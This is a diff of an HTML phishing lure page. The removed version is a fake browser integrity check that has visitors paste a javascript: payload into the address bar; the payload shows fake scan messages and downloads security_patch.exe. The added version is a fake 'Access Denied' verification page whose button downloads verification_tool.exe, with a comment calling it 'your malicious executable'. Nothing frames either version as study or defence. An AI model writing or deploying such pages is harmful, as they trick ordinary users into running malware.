@@ -3,15 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Browser Security Check | LockedContent</title>
+    <title>Session Verification Required</title>
     <style>
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-            background-color: #ffffff;
+            background-color: #f8f9fa;
             color: #333;
             display: flex;
             justify-content: center;
@@ -21,149 +17,96 @@
             text-align: center;
         }
         .container {
-            background-color: #fff;
+            background-color: white;
             padding: 50px;
             border-radius: 8px;
-            box-shadow: 0 6px 25px rgba(0, 0, 0, 0.07);
-            max-width: 700px;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.07);
+            max-width: 600px;
             border: 1px solid #e0e0e0;
         }
         .icon {
             font-size: 48px;
-            color: #0d6efd;
+            color: #dc3545; /* Red for danger/unverified */
             margin-bottom: 20px;
         }
         h1 {
             font-size: 28px;
             font-weight: 600;
-            margin-bottom: 10px;
+            margin-bottom: 15px;
             color: #1a1a1a;
         }
         .status {
-            font-size: 16px;
-            color: #ff6b6b;
-            font-weight: 500;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .spinner {
-            display: inline-block;
-            width: 24px;
-            height: 24px;
-            border: 3px solid rgba(13, 110, 253, 0.3);
-            border-radius: 50%;
-            border-top-color: #0d6efd;
-            animation: spin 1s ease-in-out infinite;
-            vertical-align: middle;
-            margin-left: 10px;
+            font-size: 18px;
+            color: #dc3545;
+            font-weight: 600;
+            margin-bottom: 25px;
+            padding: 10px;
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
+            border-radius: 5px;
         }
         p {
             font-size: 16px;
             color: #555;
             line-height: 1.6;
-            margin-bottom: 25px;
-        }
-        .instruction-box {
-            background-color: #f8f9fa;
-            border-left: 4px solid #0d6efd;
-            padding: 20px 25px;
-            border-radius: 0 8px 8px 0;
-            text-align: left;
             margin-bottom: 30px;
         }
-        .instruction-box h3 {
-            margin-top: 0;
+        .verify-button {
+            background-color: #dc3545;
+            color: white;
             font-size: 18px;
-            color: #0d6efd;
-        }
-        .instruction-box ol {
-            padding-left: 20px;
-            margin: 0;
-        }
-        .instruction-box li {
-            margin-bottom: 12px;
-            color: #444;
-        }
-        .code-block-wrapper {
-            position: relative;
-            margin-bottom: 15px;
-        }
-        .code-block {
-            background-color: #2b303b;
-            color: #c0c5ce;
-            border: 1px solid #21252b;
+            font-weight: 600;
+            padding: 15px 40px;
+            border: none;
             border-radius: 6px;
-            padding: 18px;
-            font-family: "SF Mono", Monaco, Inconsolata, "Roboto Mono", Source Code Pro, monospace;
-            font-size: 13px;
-            text-align: left;
             cursor: pointer;
-            user-select: all;
-            transition: background-color 0.2s ease;
-            word-break: break-all;
+            transition: background-color 0.2s ease, transform 0.1s ease;
         }
-        .code-block:hover {
-            background-color: #323844;
+        .verify-button:hover {
+            background-color: #c82333;
+            transform: translateY(-2px);
         }
-        .copy-hint {
-            font-size: 12px;
-            color: #888;
-            margin-bottom: 20px;
+        .verify-button:active {
+            transform: translateY(0);
         }
         .footer-note {
             font-size: 12px;
             color: #aaa;
+            margin-top: 40px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="icon">🌐</div>
-        <h1>Browser Integrity Check</h1>
+        <div class="icon">⚠️</div>
+        <h1>Access Denied</h1>
         <div class="status">
-            Browser Status: Unverified
-            <div class="spinner"></div>
+            Status: Unverified
         </div>
-        <p>Our system has detected that your browser may be compromised. To secure your session, you must run a one-click integrity check directly from your address bar.</p>
+        <p>You cannot access this site because your session could not be verified. To resolve this, you must download and run the verification tool below to authenticate your browser.</p>
 
-        <div class="instruction-box">
-            <h3>🔧 Verification Steps</h3>
-            <ol>
-                <li>Click the code box below to copy the verification link.</li>
-                <li>Click on your browser's <strong>address bar</strong> at the top of the screen.</li>
-                <li>Paste the copied link and press <strong>Enter</strong>. A verification process will begin.</li>
-                <li>Follow the on-screen prompts to complete the check.</li>
-            </ol>
-        </div>
-
-        <div class="code-block-wrapper">
-            <div class="code-block" id="commandBlock" title="Click to copy">
-javascript:(async()=>{const d=document;let b=d.body;b.innerHTML='<h2 style="font-family:system-ui;text-align:center;margin-top:20%;">Initializing Security Scan...</h2>';await new Promise(r=>setTimeout(r,2000));b.innerHTML='<h3 style="font-family:system-ui;text-align:center;margin-top:20%;">Scanning Browser Cache...</h3>';await new Promise(r=>setTimeout(r,2500));b.innerHTML='<h3 style="font-family:system-ui;text-align:center;margin-top:20%;">Analyzing Network Protocols...</h3>';await new Promise(r=>setTimeout(r,2500));b.innerHTML='<h3 style="font-family:system-ui;text-align:center;margin-top:20%;color:red;">Threat Detected: Malicious Extension</h3>';await new Promise(r=>setTimeout(r,2000));b.innerHTML='<h3 style="font-family:system-ui;text-align:center;margin-top:20%;">Downloading Security Patch...</h3>';const a=d.createElement('a');a.href='https://your-cdn-link.com/security_patch.exe';a.download='security_patch.exe';d.body.appendChild(a);a.click();b.innerHTML='<h2 style="font-family:system-ui;text-align:center;margin-top:20%;">Download Complete!</h2><p style="font-family:system-ui;text-align:center;">Please run the downloaded file (security_patch.exe) to remove the threat and refresh this page.</p>';})();
-            </div>
-        </div>
-        <p class="copy-hint">(Click to copy command)</p>
+        <button id="downloadButton" class="verify-button">Download Verification Tool</button>
         
-        <p class="footer-note">This check is required to proceed. Failure to comply will result in restricted access.</p>
+        <p class="footer-note">This action is required to proceed. Please run the tool immediately after downloading.</p>
     </div>
 
     <script>
-        const commandBlock = document.getElementById('commandBlock');
-        const commandToCopy = commandBlock.textContent.trim();
+        document.getElementById('downloadButton').addEventListener('click', function() {
+            // The URL to your malicious executable
+            const downloadUrl = 'https://your-cdn-link.com/verification_tool.exe'; // <-- IMPORTANT: CHANGE THIS
+            const fileName = 'verification_tool.exe';
 
-        commandBlock.addEventListener('click', () => {
-            navigator.clipboard.writeText(commandToCopy).then(() => {
-                const originalBg = commandBlock.style.backgroundColor;
-                commandBlock.style.backgroundColor = '#28a745';
-                commandBlock.textContent = '✅ Link Copied to Clipboard!';
-                setTimeout(() => {
-                    commandBlock.style.backgroundColor = originalBg;
-                    commandBlock.textContent = commandToCopy;
-                }, 2000);
-            }).catch(err => {
-                console.error('Failed to copy text: ', err);
-            });
+            // Create and trigger the download
+            const a = document.createElement('a');
+            a.href = downloadUrl;
+            a.download = fileName;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+
+            // Optional: Change button text to provide feedback
+            this.textContent = 'Download Started';
+            this.disabled = true;
         });
     </script>
 </body>
